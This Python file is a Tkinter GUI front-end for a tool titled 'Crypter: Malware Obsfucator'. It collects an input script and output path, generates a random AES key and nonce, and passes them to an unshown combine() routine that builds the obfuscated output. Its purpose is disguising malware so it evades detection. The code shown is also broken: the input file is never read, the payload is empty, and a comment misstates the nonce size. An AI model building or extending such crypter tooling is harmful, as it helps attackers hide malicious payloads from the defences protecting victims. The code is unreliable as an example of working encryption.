import tkinter as tk
from tkinter import ttk, filedialog
from src.combiner import combine
import os

def select_input_file():
    file_path = filedialog.askopenfilename(filetypes=[("Python files", "*.py")])
    input_file_entry.delete(0, tk.END)
    input_file_entry.insert(0, file_path)

def select_output_path():
    output_path = filedialog.askdirectory()
    output_path_entry.delete(0, tk.END)
    output_path_entry.insert(0, output_path)

def process_files():
    input_file_path = input_file_entry.get()
    output_path = output_path_entry.get()
    output_file_name = output_file_name_entry.get()
    if not output_file_name.endswith(".py"):
        output_file_name += ".py"
    output_path = output_path + "/" + output_file_name
    print(output_path)
    key = os.urandom(32)  # Generate a random key (AES key size is 256 bits)
    nonce = os.urandom(16)  # Generate a random nonce (GCM nonce size is 96 bits)
    tag=b""
    payload=b""
    combine(key, nonce, tag, payload, output_path)

window = tk.Tk()
window.title("Crypter: Malware Obsfucator")

# Input file path
input_file_label = ttk.Label(window, text="Input File Path:")
input_file_label.grid(row=0, column=0, padx=10, pady=5)
input_file_entry = ttk.Entry(window, width=40)
input_file_entry.grid(row=0, column=1, padx=10, pady=5)
input_file_button = ttk.Button(window, text="Browse", command=select_input_file)
input_file_button.grid(row=0, column=2, padx=10, pady=5)

# Output path
output_path_label = ttk.Label(window, text="Output Path:")
output_path_label.grid(row=1, column=0, padx=10, pady=5)
output_path_entry = ttk.Entry(window, width=40)
output_path_entry.grid(row=1, column=1, padx=10, pady=5)
output_path_button = ttk.Button(window, text="Browse", command=select_output_path)
output_path_button.grid(row=1, column=2, padx=10, pady=5)

# Output file name
output_file_name_label = ttk.Label(window, text="Output File Name:")
output_file_name_label.grid(row=2, column=0, padx=10, pady=5)
output_file_name_entry = ttk.Entry(window, width=40)
output_file_name_entry.grid(row=2, column=1, padx=10, pady=5)

# Process files button
process_button = ttk.Button(window, text="Obsfucate the Malware!", command=process_files)
process_button.grid(row=3, column=1, pady=10)

# Start the GUI event loop
window.mainloop()
